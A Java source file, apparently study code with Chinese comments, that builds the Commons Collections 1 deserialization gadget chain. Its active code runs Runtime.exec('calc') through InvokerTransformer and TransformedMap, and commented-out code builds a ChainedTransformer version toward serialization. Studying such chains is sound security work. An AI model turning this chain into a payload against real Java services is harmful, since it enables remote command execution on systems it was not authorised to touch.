/*
 * Copyright (c) 2024. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.deserialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class LidyCC1 {
    public static void main(String[] args) {
//        // 普通反射执行
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        invokerTransformer.transform(runtime);


//        // 通过transform方法改写
//        Class rt = Runtime.class;
//        // 通过InvokerTransformer获取getRuntime方法
//        Method getRuntime = (Method) new InvokerTransformer(
//                "getDeclaredMethod",
//                new Class[]{String.class,Class[].class},
//                new Object[]{"getRuntime",null}
//        ).transform(rt);
//        // 通过InvokerTransformer获取Runtime对象
//        Object runtime1 = (Object) new InvokerTransformer(
//                "invoke",
//                new Class[]{Object.class,Object[].class},
//                new Object[]{null,null}
//        ).transform(getRuntime);
//        // 通过InvokerTransformer执行calc命令
//        new InvokerTransformer(
//                "exec",
//                new Class[]{String.class},
//                new Object[]{"calc"}
//        ).transform(runtime1);


        //首先通过反射获取exec方法
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});

        //实例化一个HashMap对象用于decorate方法接收
        HashMap<Object,Object> map = new HashMap<>();
        //首先通过put方法推一个键值对进去，才能进行遍历
        map.put("test","value");
        //调用public方法decorate实例化
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);

        //遍历Map的常用格式
        for(Map.Entry<Object, Object> entry:transformedMap.entrySet()){
            //通过setValue方法传入Runtime对象
            entry.setValue(runtime);
        }


//        // 通过ChainedTransformer改写
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//
//        // 创建一个TransformedMap对象，并与chainedTransformer绑定
//        HashMap<Object, Object> map = new HashMap<>();
//        // 向map中添加一个键值对，有一个键值对才能进行遍历
//        map.put("value", "test value");
//        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
//
//        // 序列化最终生成的AnnotationInvocationHandler对象
    }
}
